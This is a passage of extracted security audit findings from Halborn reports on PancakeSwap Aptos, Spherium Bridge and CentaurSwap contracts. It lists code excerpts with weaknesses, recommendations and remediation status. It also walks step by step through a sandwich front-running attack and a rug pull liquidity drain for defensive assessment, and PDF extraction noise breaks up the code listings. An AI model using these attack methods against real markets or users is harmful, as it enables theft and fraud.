"https://github.com/HalbornSecurity/PublicReports/tree/master/Move Smart Contract Audits/PancakeSwap_Aptos_DEX_Move_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Multisig wallets can be initialized as long as the threshold (i.e.: minimum amount of approvals for a transaction to be later executed) is greater or equal than 1. This default validation is not inherently secure and the good practices for handling multisig wallets recommend a reasonably secure setup for threshold (e.g.: 2 of 3, 3 of 5, etc.) in case 1 or more owners are malicious, or their keys get compromised. Code Location: Minimum threshold is set in 1: Listing 4: pancake-multisig-wallet/sources/multisig_wallet.move (Line 36) 35 const MAX_U64 : u64 = 18446744073709551615; 36 const MIN_THRESHOLD : u8 = 1; Multisig wallets are initialized as long as threshold is greater or equal than minimum threshold (1), no matter how many owners are included in the wallet: Listing 5: pancake-multisig-wallet/sources/multisig_wallet.move (Line 133) 131 public fun initialize ( sender : & signer , owner_addresses : vector <  address >, threshold : u8 ) { 132 133 let num_owners = vector :: length (& owner_addresses ); assert !( threshold >= MIN_THRESHOLD ,  ERROR_LESS_THAN_MIN_THRESHOLD ); 134 assert !(( threshold as u64 ) <= num_owners ,  ERROR_MORE_THAN_NUM_OWNERS ); 22 Risk Level: Likelihood - 1 Impact - 3 Recommendation: It is recommended that multisig_wallet module allows creators to define a ratio when initializing wallets, so the threshold can be secure enough according to the amount of owners included in the wallets. For example, if the ratio is 33% and the amount of owners is 6, the threshold in this multisig wallet is required to be greater or equal than 2 (not just 1). Remediation plan: RISK ACCEPTED: The PancakeSwap team accepted the risk of this finding and also stated that they will mitigate this issue from the Ops side. 23 ", "labels": ["Halborn", "PancakeSwap_Aptos_DEX_Move", "Severity: Low"]}, {"title": "MINIMUM THRESHOLD IN MULTISIG WALLETS IS NOT UPDATED SECURELY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Move Smart Contract Audits/PancakeSwap_Aptos_DEX_Move_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The amount of owners or the threshold in multisig wallets can be updated as long as the threshold (i.e.: minimum amount of approvals for a transaction to be later executed) is greater or equal than 1. This verification does not guarantee that the new setup for the wallet after the update follows the good practices for handling multisig wallets, e.g.: 2 approvers out of 3 owners, 3 of 5, etc. Code Location: init_add_owner function only verifies that the new owner does not already exist, but does not check that the threshold remains reasonably secure after adding one more owner: Listing 6: pancake-multisig-wallet/sources/multisig_wallet.move (Line 249) 247 public fun init_add_owner ( sender : & signer , multisig_wallet_addr :  address , eta : u64 , expiration : u64 , owner : address ) acquires  MultisigWallet , MultisigTxs , MultisigWalletEvents { 248 let multisig_wallet = borrow_global < MultisigWallet >(  multisig_wallet_addr ); 249 assert !(! Table :: contains (& multisig_wallet . owners , owner ) ,  ERROR_OWNER_ALREADY_EXIST ); 250 init_multisig_tx < AddOwnerParams >( sender , multisig_wallet_addr ,  eta , expiration , AddOwnerParams { owner , }) ; 251 252 253 } 24 init_set_threshold function only verifies that the new threshold is greater or equal than minimum threshold (1), no matter how many own- ers are included in the wallet: Listing 7: pancake-multisig-wallet/sources/multisig_wallet.move (Line 267) 264 public fun init_set_threshold ( sender : & signer ,  multisig_wallet_addr : address , eta : u64 , expiration : u64 ,  threshold : u8 ) acquires MultisigWallet , MultisigTxs ,  MultisigWalletEvents { 265 let multisig_wallet = borrow_global < MultisigWallet >(  multisig_wallet_addr ); 266 assert !(( threshold as u64 ) <= Table :: length (& multisig_wallet .  owners ) , ERROR_MORE_THAN_NUM_OWNERS ); assert !( threshold >= MIN_THRESHOLD , 267  ERROR_LESS_THAN_MIN_THRESHOLD ); 268 init_multisig_tx < SetThresholdParams >( sender ,  multisig_wallet_addr , eta , expiration , SetThresholdParams { threshold , }) ; 269 270 271 } Risk Level: Likelihood - 1 Impact - 3 Recommendation: is to logic update recommended It and the init_set_threshold functions to allow changes only if threshold value remains reasonably secure. The proposed ratio value can be helpful for this purpose, see the recommendation for the following issue for more details: (HAL-04) INSECURE MINIMUM THRESHOLD WHEN INITIALIZING MULTISIG WALLETS. init_add_owner of 25 Remediation plan: RISK ACCEPTED: The PancakeSwap team accepted the risk of this finding and also stated that they will mitigate this issue from the Ops side. 26 ", "labels": ["Halborn", "PancakeSwap_Aptos_DEX_Move", "Severity: Low"]}, {"title": "ETA IS NOT COMPLETELY VERIFIED WHEN INITIATING MULTISIG TRANSACTIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Move Smart Contract Audits/PancakeSwap_Aptos_DEX_Move_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The following functions in multisig_wallet module do not verify that eta is greater than current timestamp at initiating multisig transactions:  init_add_owner  init_remove_owner  init_set_threshold  init_withdraw  init_multisig_tx As a consequence, an owner can mistakenly make a multisig transaction available to be executed before it is expected. Code Location: Listing 8: Affected resources 1 Module : 2 ====== 3 multisig_wallet 4 5 Functions : 6 ========= 7 init_add_owner : L #247 8 init_remove_owner : L #255 9 init_set_threshold : L #264 10 init_withdraw : L #283 11 init_multisig_tx : L #295 27 Risk Level: Likelihood - 2 Impact - 2 Recommendation: It is recommended to update the logic of the functions mentioned above to verify that eta is greater than current timestamp for initiating multisig transactions. Remediation plan: RISK ACCEPTED: The PancakeSwap team accepted the risk of this finding and also stated that they will mitigate this issue from the Ops side. 28 ", "labels": ["Halborn", "PancakeSwap_Aptos_DEX_Move", "Severity: Low"]}, {"title": "MISLEADING ERROR MESSAGES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Move Smart Contract Audits/PancakeSwap_Aptos_DEX_Move_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Error messages shown in certain sections of code have inaccurate infor- mation, which could mislead legitimate users if these messages appear during a failed operation in pancake-swap contract while swapping. Code Location: The following functions used during swapping operations will throw the ERROR_INSUFFICIENT_OUTPUT_AMOUNT error message when the value of certain output coin is different from zero. However, this error message could mislead users and make them think that the operation failed because no enough output coins were generated during the swapping, which is not true and does not explain the root cause of the error: Listing 9: pancake-swap/sources/swap/swap.move (Line 448) 440 public ( friend ) fun swap_exact_x_to_y_direct <X , Y >( 441 442 ): ( coin :: Coin <X >, coin :: Coin <Y >) acquires TokenPairReserve , coins_in : coin :: Coin <X >  TokenPairMetadata { 443 444 445 446 let amount_in = coin :: value <X >(& coins_in ); deposit_x <X , Y >( coins_in ); let ( rin , rout , _) = token_reserves <X , Y >() ; let amount_out = swap_utils :: get_amount_out ( amount_in , rin , rout  ); 447 448 let ( coins_x_out , coins_y_out ) = swap <X , Y >(0 , amount_out ); assert !( coin :: value <X >(& coins_x_out ) == 0,  ERROR_INSUFFICIENT_OUTPUT_AMOUNT ); ( coins_x_out , coins_y_out ) 449 450 } 29 Listing 10: pancake-swap/sources/swap/swap.move (Line 471) 466 public ( friend ) fun swap_x_to_exact_y_direct <X , Y >( 467 468 ): ( coin :: Coin <X >, coin :: Coin <Y >) acquires TokenPairReserve , coins_in : coin :: Coin <X >, amount_out : u64  TokenPairMetadata { 469 470 471 deposit_x <X , Y >( coins_in ); let ( coins_x_out , coins_y_out ) = swap <X , Y >(0 , amount_out ); assert !( coin :: value <X >(& coins_x_out ) == 0,  ERROR_INSUFFICIENT_OUTPUT_AMOUNT ); ( coins_x_out , coins_y_out ) 472 473 } Listing 11: pancake-swap/sources/swap/swap.move (Line 509) 504 public ( friend ) fun swap_y_to_exact_x_direct <X , Y >( 505 506 ): ( coin :: Coin <X >, coin :: Coin <Y >) acquires TokenPairReserve , coins_in : coin :: Coin <Y >, amount_out : u64  TokenPairMetadata { 507 508 509 deposit_y <X , Y >( coins_in ); let ( coins_x_out , coins_y_out ) = swap <X , Y >( amount_out , 0) ; assert !( coin :: value <Y >(& coins_y_out ) == 0,  ERROR_INSUFFICIENT_OUTPUT_AMOUNT ); ( coins_x_out , coins_y_out ) 510 511 } Listing 12: pancake-swap/sources/swap/swap.move (Line 522) 514 public ( friend ) fun swap_exact_y_to_x_direct <X , Y >( 515 516 ): ( coin :: Coin <X >, coin :: Coin <Y >) acquires TokenPairReserve , coins_in : coin :: Coin <Y >  TokenPairMetadata { 517 518 519 520 let amount_in = coin :: value <Y >(& coins_in ); deposit_y <X , Y >( coins_in ); let ( rout , rin , _) = token_reserves <X , Y >() ; let amount_out = swap_utils :: get_amount_out ( amount_in , rin , rout  ); 521 522 let ( coins_x_out , coins_y_out ) = swap <X , Y >( amount_out , 0) ; assert !( coin :: value <Y >(& coins_y_out ) == 0,  ERROR_INSUFFICIENT_OUTPUT_AMOUNT ); ( coins_x_out , coins_y_out ) 523 524 } 30 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Correct error messages to show more accurate information and to avoid confusing users if these messages appear. Remediation plan: ACKNOWLEDGED: The PancakeSwap team acknowledged this finding. 31 ", "labels": ["Halborn", "PancakeSwap_Aptos_DEX_Move", "Severity: Informational"]}, {"title": "UNNECESSARY USE OF MUTABLE REFERENCES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Move Smart Contract Audits/PancakeSwap_Aptos_DEX_Move_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "admin and fee_to functions in swap module use mutable references whose values are not later changed. This issue does not trigger an exploitable scenario, but is included in the report as a good practice based on the principle of least privilege. Code Location: Functions that make unnecessary use of mutable references: Listing 13: pancake-swap/sources/swap/swap.move (Line 273) 272 public fun admin () : address acquires SwapInfo { 273 274 275 } let swap_info = borrow_global_mut < SwapInfo >( RESOURCE_ACCOUNT ); swap_info . admin Listing 14: pancake-swap/sources/swap/swap.move (Line 278) 277 public fun fee_to () : address acquires SwapInfo { 278 279 280 } let swap_info = borrow_global_mut < SwapInfo >( RESOURCE_ACCOUNT ); swap_info . fee_to Risk Level: Likelihood - 1 Impact - 1 32 Recommendation: It is recommended to utilize immutable references by using borrow_global operation instead of borrow_global_mut in the functions mentioned above. Remediation plan: ACKNOWLEDGED: The PancakeSwap team acknowledged this finding. 33 ", "labels": ["Halborn", "PancakeSwap_Aptos_DEX_Move", "Severity: Informational"]}, {"title": "UNUSED FUNCTIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Move Smart Contract Audits/PancakeSwap_Aptos_DEX_Move_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Some functions in the multisig_wallet module are declared in the code, but not used appropriately. This is not a security issue itself, but a good practice recommendation to improve code hygiene. Code Location: next_seq_number function is declared in the code, but never used by any other function, except during tests. Listing 15: pancake-multisig-wallet/sources/multisig_wallet.move 201 public fun next_seq_number ( multisig_wallet_addr : address ): u64  acquires MultisigWallet { 202 let multisig_wallet = borrow_global < MultisigWallet >(  multisig_wallet_addr ); Table :: length (& multisig_wallet . seq_number_to_params_type_name ) 203 204 } is_withdraw_multisig_txs_registered function is declared in the code, but not used in the assert of the init_withdraw function: Listing 16: pancake-multisig-wallet/sources/multisig_wallet.move 273 public fun is_withdraw_multisig_txs_registered < CoinType >( addr :  address ): bool { exists < MultisigTxs < WithdrawParams < CoinType > > >( addr ) 274 275 } Listing 17: pancake-multisig-wallet/sources/multisig_wallet.move (Line 284) 283 public fun init_withdraw < CoinType >( sender : & signer ,  multisig_wallet_addr : address , eta : u64 , expiration : u64 , amount : 34  u64 ) acquires MultisigWallet , MultisigTxs , MultisigWalletEvents { 284 assert !( exists < MultisigTxs < WithdrawParams < CoinType > > >(  multisig_wallet_addr ) , ERROR_MULTISIG_TXS_NOT_EXIST ); let sender_addr = signer :: address_of ( sender ); 285 Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to include the #[test] annotation in next_seq_number function and use is_withdraw_multisig_txs_registered in the assert of the init_withdraw function. Remediation plan: ACKNOWLEDGED: The PancakeSwap team acknowledged this finding. 35 THANK YOU FOR CHOOSING", "labels": ["Halborn", "PancakeSwap_Aptos_DEX_Move", "Severity: Informational"]}, {"title": "IGNORE RETURN VALUES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Spherium_Bridge_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "The return value of an external call is not stored in a local or state variable. In contract Bridge.sol, there is an instances where external methods are being called and return value(bool) is being ignored. It was observed that Bridge.executeProposal(Bridge.Proposal) ignores re- turn value by IERC20(proposal.tokenAddress).transfer(proposal.depositor,proposal. amount). Code Location: Listing 2: Bridge.sol (Lines 395,396,397,398) 388 389 390 391 392 393 394 395 396 397 398 399 400 function executeProposal ( Proposal storage proposal ) private whenNotPaused { if ( _burnList [ proposal . tokenAddress ]) { IERC20 ( proposal . tokenAddress ). mint ( proposal . depositor , proposal . amount ); } else { IERC20 ( proposal . tokenAddress ). transfer ( proposal . depositor , proposal . amount ); } } Risk Level: Likelihood - 3 Impact - 2 12 Recommendations: Add return value check to avoid unexpected crash of the contract. Return value check will help in handling the exceptions better way. Remediation Plan: SOLVED: Spherium.Finance Team updated the code and added the return value. Listing 3: Bridge.sol (Lines 393,394,395,396,397) 392 393 394 395 396 397 398 } else { bool result = IERC20 ( proposal . tokenAddress ). transfer ( proposal . depositor , proposal . amount ); require ( result , \" unsuccessful transfer \" ); } 13 ", "labels": ["Halborn", "Spherium_Bridge", "Severity: Low"]}, {"title": "FLOATING PRAGMA", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Spherium_Bridge_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "Bridge Smart contract uses the floating pragma 0.8.0. Contract should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, either an outdated compiler version that might introduce bugs that affect the contract system negatively or a pragma version too new which has not been extensively tested. Code Location: Listing 4: (Lines 1) 1 pragma solidity ^0.8.0; 2 } Risk Level: Likelihood - 1 Impact - 3 Recommendations: Consider locking the pragma version with known bugs for the compiler When possible, do not use floating pragma in the final live version. deployment. Specifying a fixed compiler version ensures that the bytecode produced does not vary between builds. This is especially important if you rely on bytecode-level verification of the code. Remediation Plan: SOLVED: Spherium.Finance Team locked the pragma version. 14 ", "labels": ["Halborn", "Spherium_Bridge", "Severity: Low"]}, {"title": "PRAGMA VERSION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Spherium_Bridge_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "Bridge contract uses one of the latest pragma version (0.8.0) which was released on December 16, 2020. The latest pragma version (0.8.7) was released in August 2021. Many pragma versions have been lately released, going from version 0.7.x to the recently released version 0.8.x. in just 6 months. Reference: https://github.com/ethereum/solidity/releases In the Solitidy Github repository, there is a json file where are all bugs finding in the different compiler versions. It should be noted that pragma 0.6.12 and 0.7.6 are widely used by Solidity developers and have been extensively tested in many security audits. Reference: https://github.com/ethereum/solidity/blob/develop/docs/bugs_- by_version.json Code Location: Listing 5: (Lines 1) 1 pragma solidity ^0.8.0; 2 } Risk Level: Likelihood - 1 Impact - 2 15 Recommendations: If possible, consider using the latest stable pragma version that has been thoroughly tested to prevent potential undiscovered vulnerabilities such as pragma between 0.6.12 - 0.7.6. Remediation Plan: SOLVED: Spherium.Finance Team updated the code currently uses pragma version 0.7.6. 16 ", "labels": ["Halborn", "Spherium_Bridge", "Severity: Informational"]}, {"title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Spherium_Bridge_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "In public functions, array arguments are immediately copied to memory, while external functions can read directly from calldata. Reading Public functions need to calldata is cheaper than memory allocation. write the arguments to memory because public functions may be called internally. Internal calls are passed internally by pointers to memory. Thus, the function expects its arguments being located in memory when the compiler generates the code for an internal function. Code Location: Mark below functions as external instead of public: Bridge.sol: getDepositCount, addWhitelistToken, deposit, withdraw, withdrawBridgeFee Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider as much as possible declaring external variables instead of public variables. As for best practices, you should use external if you expect that the function will only ever be called externally and use public if you need to call the function internally. Mainly, Marking both function as external can save gas. 17 Remediation Plan: SOLVED: Spherium.Finance Team updated the code and declared external functions instead of public. 18 ", "labels": ["Halborn", "Spherium_Bridge", "Severity: Informational"]}, {"title": "UNUSED CODE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Spherium_Bridge_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "During the test, It has been observed that some of the contract codes not used. There are a few instances of unused code (dead code) in the Bridge.sol. Code Location: Listing 6: (Lines 25) 25 uint8 chainID ; Listing 7: (Lines 334) 334 function withdraw () public {} Risk Level: Likelihood - 1 Impact - 1 Recommendations: Unused codes should be deleted. Remediation Plan: SOLVED: Spherium.Finance Team removed the unused code in the contract. 19 ", "labels": ["Halborn", "Spherium_Bridge", "Severity: Informational"]}, {"title": "DERIVED RISKS FROM FLASH LOANS ASSESSMENT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Financial Pentesting/CentaurSwap_Financial_Pentesting_Halborn_v1_1.pdf", "body": "All the latest attacks started with a Flash loan, and have lately become typical in arbitrage. Flash loans allow an attacker to borrow some funds without any collateral, and the loan is finished and returned in a single transaction. They are executed atomically and without risk. No one is able to intercept a flash loan while it is being performed, then it is used for attackers to quickly get liquidity to fund a financial based attack. For instance, in one of the latest attacks (PancakeBunny) the attacker took 8 different flash loans. Then, the attacker used the liquidity to perform several actions, one of them was used to influence the valuation of the pool (WBNB+BUSDT) swapping 2.32M WBNB for 3.83M BUSDT. PancakeBunny Incident Code Location: Centaur Swap uses a settlement system that prevents the tokens from being swapped on the same transaction. This system would cause any flash loan to revert to its initial state if pending settlements are detected on either of the swapped pools as seen in Listing 1. Listing 1: CentaurPool.sol 1 function swapFrom ( address _sender ) external lock onlyRouter tradeAllowed returns ( uint amount , uint value ) { uint balance = IERC20 ( baseToken ). balanceOf ( address ( this )) ; require ( balance > baseTokenBalance , ' CentaurSwap : INSUFFICIENT_SWAP_AMOUNT '); // Check if has pendingSettlement 2 3 4 5 6 16 S R O T C A F K S I R D E S A B L O C O T O R P 7 8 address settlement = ICentaurFactory ( factory ). settlement () ; require (! ICentaurSettlement ( settlement ). hasPendingSettlement ( _sender , address ( this )) , ' CentaurSwap : PENDING_SETTLEMENT ') ; amount = balance . sub ( baseTokenBalance ); value = getValueFromAmountIn ( amount ); baseTokenBalance = balance ; emit AmountIn ( _sender , amount ); return ( amount , value ); 9 10 11 12 13 14 15 16 17 18 } Result: The assessment is considered successful since flash loans are being prevented by the usage of the settlement system which prevents the swap from fully taking place with the same transaction. 17 S R O T C A F K S I R D E S A B L O C O T O R P ", "labels": ["Halborn", "CentaurSwap_Financial_Pentesting_Halborn_v1_1", "Severity: Informational"]}, {"title": "FRONT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Financial Pentesting/CentaurSwap_Financial_Pentesting_Halborn_v1_1.pdf", "body": "The main issues that make a system vulnerable to front-running attacks are: a lack of transaction confidentiality, and the miners opportunity to arbitrarily execute transactions that can happen as a consequence of an asynchronous system. To prevent the front-running attack, a reliable method must address these two issues, or the entire structure must be changed to prevent race conditions. S R O T C A F K S I R D E S A B L O C O T O R P 18 Sandwich Attack Example: A sandwich attacks profit is the difference between the tokens spent in the initial buy activity and received in the final sell. The attacker has no control over the initial reserves or the victims trade amount; the only variable under his control is the initial amount to trade in the front-run. 1. The first user initiated a normal transaction to get a token swapped. The normal user sets gas price to 10 Gwei. 2. The attacker initiate buy transaction with more gas (20 Gwei). The attacker transaction gains priority under the gas competition mechanism. 3. The Attacker launched another sell transaction at the same moment, this time setting Gas Price to 10 Gwei, which was completed immediately after the normal users trade due to the chronological nonce order. 4. Two attack transactions are mixed with one normal transaction, therefore it is named as an sandwich attack. Result: Centaur Swap uses a settlement system that prevents the tokens from being swapped on the same transaction. This system would cause any front run attack to be delayed until the settlement is completed. This would prevent sandwich attacks from taking place with the same transaction. 19 S R O T C A F K S I R D E S A B L O C O T O R P ", "labels": ["Halborn", "CentaurSwap_Financial_Pentesting_Halborn_v1_1", "Severity: Informational"]}, {"title": "LIQUIDITY LOSS EXPOSURE RISK ASSESSMENT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Financial Pentesting/CentaurSwap_Financial_Pentesting_Halborn_v1_1.pdf", "body": "Uniswap is a protocol that allows buyers and sellers to swap ERC20 tokens without an exchange or order book. It uses an algorithmic equation that determines the swap rate automatically based on the balances of both tokens, as well as the actual demand for this swapping pair. For instance, the term known as rug pull in De-Fi slang, is a malicious maneuver in the cryptocurrency industry where crypto developers abandon a project and run away with investors funds. Since anyone can spin up a token and smart contract on Ethereum and list it on Uniswap, some developers have come up with unintended liquidity extraction operations. The con begins with minting new tokens, creating Telegram groups to get the buzz going, followed by a Uniswap listing and liquidity injection. At this point, the original malicious liquidity provider would wait for people to swap their ETH for the newly minted coin, after which the tokens creators would drain the liquidity pool, leaving holders with nothing but a worthless coin. Example of a Liquidity Loss event: 1. Someone creates a Token Named \" XYZ \" with total supply of 1 Million and deploys it on the Ethereum network. 2. The rug-puller opens Uniswap and creates a liquidity pool for XYZ / ETH. with 1 million XYZ and 100 ETH. ( 1 ETH = 10,000 XYZ ) 3. Then the rug-puller doe the professional marketing for the Token XYZ on different platforms that anyone can buy XYZ from Uniswap. 4. External users buy XYZ from Uniswap Exchange giving ETH or any other ERC-20 token like UNI in Liquidity pool of XYZ / ETH. ( Uniswap 20 S R O T C A F K S I R D E S A B L O C O T O R P converts any Token into ETH automatically). 5. 10 external users buy 30 ETH worth of XYZ from Uniswap and no one from them adds XYZ token and ETH to XYZ/ETH pool on uniswap that you created. So it means that the rug-puller has 130 ETH now and 700000 XYZ. ( XYZ Token isnt listed anywhere else so its value is Zero ). 6. The rug-puller pulls the trigger and removes the 130 ETH and 700000 XYZ Tokens from Uniswap. The website closes, marketing closes and social networks are removed. This situation is often enabled because a single owner of a contract, or a liquidity address has access to remove all the TVL (Total Value Locked) through a withdraw or transfer function. While sometimes, the developer or owner does not intend to do this malicious act, the risk still exists if the private key is stolen since there is nothing preventing the key-holder from calling the withdraw. Code Location: Furthermore, during code audit some functions were found and considered of critical risk for the liquidity loss exposure assessment. Those functions allows the owners of the system to perform emergency withdraw from any pool with any amount specified. The functions can be seen on Listing 2 and Listing 3. Listing 2: CentaurFactory.sol 136 function emergencyWithdrawFromPool ( address _pool , address _token , uint _amount , address _to ) external onlyOwner override { ICentaurPool ( _pool ). emergencyWithdraw ( _token , _amount , _to ); 137 138 } Listing 3: CentaurPool.sol 303 function emergencyWithdraw ( address _token , uint _amount , address _to ) external onlyFactory { _safeTransfer ( _token , _to , _amount ); emit EmergencyWithdraw ( block . timestamp , _token , _amount , _to ); 304 305 306 21 S R O T C A F K S I R D E S A B L O C O T O R P 307 } Result: The assessment is considered unsuccessful since the functions present on the CentaurFactory and CentaurPool which allows the owner of the pool to perform emergencyWithdraw are considered of high risk and the community should be aware of the existence. It is recommended to completely remove this functionality. Furthermore it is recommended to change the ownership management to a RBAC (Role Based Access Control) system. The Centaur swap pool does only use the onlyOwner modifier to perform critical actions such as enabling/disabling funds withdrawal on specific pools, enabling transfers and so on. However, this functionality should be split between multiple role based users with multi-signature wallets for each one. For example, for the pausing/unpausing functionality of the entire pools, a Pauser role should be created for example and use its modifier onlyPauser. For the emergencyWithdraw functionality a new role named Emergency should be created independent from the owner and use modifiers such as Emergency isPaused onlyEmergencyOwner and only have this funtionality to take place only once the contract has been paused using the Pauser role. The owner should be limited to the minimum operations possible that allows pool management. For the liquidity loss exposure protection itself, Centaur Swap uses oracle prices from Chainlink sources and liquidity checks to prevent this type of attacks. However, issues could arise on the data feed causing price manipulation or invalid calculations as explained in the Price feed - Oracle Risk Assessment. In order to facilitate the trustworthy of the pool it is recommended to use a service that allows Proof of Liquidity. Proof of Liquidity makes it impossible for scammers to take out their liquidity as they are vested for a period of time to enhance development and innovation on the platform. This is ensured by locking the liquidity This means that of tokens that are pre-launched on their platform. 22 S R O T C A F K S I R D E S A B L O C O T O R P project owners cannot pull the liquidity from their project in a way that cons investors out of their money, or tokens. As such issues become prevalent across the DeFi system, projects such as Unicrypt, LID Protocol, and Vesta Protocol aim at solving these liquidity problems on Uniswap and similar DEXs in the future. As it explained before, a rug pull scam mainly arises some minutes, days, or a couple of weeks following the liquidity injection from the hacker. Such a huge sell-off of tokens leads to cascading collapse of projects, whereby the small action of withdrawing liquidity for a profit leads to an eventual collapse of the system. The most common means that reputable teams use to lock their pooled liquidity and gain additional user confidence and trust are through Its also very easy to verify Unicrypt (https://unicrypt.network/). whether or not liquidity for a particular pair is locked and the date that it is locked to. Another recommendation is to integrate OpenZepplin Defender platform. With defender, Sentinels are used to automatically monitor and respond to events, functions, and transaction parameters on your smart contracts. With full Autotask integration, you can add circuit breakers or automated actions so your team can respond to attacks within seconds and receive notifications via email, Slack, Telegram, or Discord. If possible, add to operational processes to research what the coin funds are used for, who the team behind the coins are and the history of trades with this coin. Remediation Plan: PARTIALLY SOLVED: Centaur Swap team implemented a Timelock Contract and multi-signature wallets for: Admin, Normal and Emergency roles. 23 S R O T C A F K S I R D E S A B L O C O T O R P BLOCKCHAIN TRANSACTION BASED RISK FACTORS 24 ", "labels": ["Halborn", "CentaurSwap_Financial_Pentesting_Halborn_v1_1", "Severity: Critical"]}, {"title": "GOVERNANCE RISK ASSESSMENT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Financial Pentesting/CentaurSwap_Financial_Pentesting_Halborn_v1_1.pdf", "body": "In smart contracts which are already running on the blockchain, the upgrading of them is done by a method known as Governance. Governance can be centralized and distributed. Distributed governance allows voters (the ones with the most tokens) to decide actions on smart contracts. If an attacker is able to hijack the governance contract, malicious Thus, controversial governance actions provokes a critical risk. governance proposals can be approved using flash loans. Using flash loans for controlling the Governance In a distributed Governance, the community should be vigilant. For instance, they can burn all tokens involved in any attack performed by flash loans. Governance Hijacking 25 S R O T C A F K S I R D E S A B N O I T C A S N A R T N I A H C K C O L B Code Location: WheyFarm.sol S R O T C A F K S I R D E S A B N O I T C A S N A R T N I A H C K C O L B Centaur Swap uses a centralized governance to create pools, update the states of the liquidity pools and manage Whey tokens. Result: The assessment is considered as passed since governance is centralized. Consider keeping the private key safe or using a multi-signature wallet is enough to prevent the contract from being maliciously updated. Attackers cannot manipulate governance by flash loans. 26 ", "labels": ["Halborn", "CentaurSwap_Financial_Pentesting_Halborn_v1_1", "Severity: Low"]}, {"title": "TOKEN INFLATION RISK ASSESSMENT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Financial Pentesting/CentaurSwap_Financial_Pentesting_Halborn_v1_1.pdf", "body": "Liquidity providers are responsible for ensuring that liquidity pools are well funded. Ideally, liquidity pools are well funded but there may be under founded liquidity pools (when there is a lack of liquidity by both pairs) and zombie pools. In zombie pools, there is many tokens from one of the pairs with respect to the other token of the pair. This can cause token inflation and flash loans cause this to happen. Swapping a huge amount for a token to another can inflate the price of one of the tokens in a pair. Some recent attacks used flash loans to swap from a token to another and unbalanced the token pairs. Furthermore, not taking into account the possibility of inflationary or deflationary tokens can cause the total amount of the pool to be misinterpreted. Code Location: Centaur Swap framework has mechanisms to avoid the token inflation First, the owner of CentaurFactory.sol contract is able to price. lock depositing, withdrawals and trading at the same time and each one separately. Listing 4: CentaurFactory.sol 101 // Pool Functions 102 function setPoolTradeEnabled ( address _pool , bool _tradeEnabled ) public onlyOwner override { ICentaurPool ( _pool ). setTradeEnabled ( _tradeEnabled ); 103 104 } 105 27 S R O T C A F K S I R D E S A B N O I T C A S N A R T N I A H C K C O L B 106 function setPoolDepositEnabled ( address _pool , bool _depositEnabled ) public onlyOwner override { ICentaurPool ( _pool ). setDepositEnabled ( _depositEnabled ); 107 108 } 109 110 function setPoolWithdrawEnabled ( address _pool , bool _withdrawEnabled ) public onlyOwner override { ICentaurPool ( _pool ). setWithdrawEnabled ( _withdrawEnabled ); 111 112 } In addition, the use of an internal token such as CentaurLPToken. CentaurLPToken.sol manages by minting or burning internal tokens that the pool does not become unbalanced. Listing 5: CentaurLPToken.sol 20 function _mint ( address to , uint value ) internal { totalSupply = totalSupply . add ( value ); 21 balanceOf [ to ] = balanceOf [ to ]. add ( value ); 22 emit Transfer ( address (0) , to , value ); 23 24 } 25 26 function _burn ( address from , uint value ) internal { 27 28 29 30 } balanceOf [ from ] = balanceOf [ from ]. sub ( value ); totalSupply = totalSupply . sub ( value ); emit Transfer ( from , address (0) , value ); Furthermore, no issues were found during the manipulation of deflationary or inflationary tokens. As seen on Listing 6 the amount used for the liquidity calculation is taken from the subtraction of the previous baseTokenBalance and the current pool balance of that token. The minted tokens will be taken from that subtraction. With this approach the minted tokens will always take into account the difference between the previous balance and the current one. However, if manual transactions are performed before any liquidity is added those will be accredited to the first one calling the addLiquidity function. 28 S R O T C A F K S I R D E S A B N O I T C A S N A R T N I A H C K C O L B Listing 6: CentaurPool.sol (Lines 101,110) 99 function mint ( address to ) external lock onlyRouter depositAllowed returns ( uint liquidity ) { uint balance = IERC20 ( baseToken ). balanceOf ( address ( this )) ; uint amount = balance . sub ( baseTokenBalance ); if ( totalSupply == 0) { liquidity = amount . add ( baseTokenTargetAmount ); } else { liquidity = amount . mul ( totalSupply ). div ( baseTokenTargetAmount ); } require ( liquidity > 0, ' CentaurSwap : INSUFFICIENT_LIQUIDITY_MINTED '); _mint (to , liquidity ); baseTokenBalance = baseTokenBalance . add ( amount ); baseTokenTargetAmount = baseTokenTargetAmount . add ( amount ); emit Mint ( msg . sender , amount ); 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 } Result: The assessment is considered successful since the pool balance methodology proposed by Centaur Swap team is adequate and prevents manipulating the price of a token and unbalancing a pool. 29 S R O T C A F 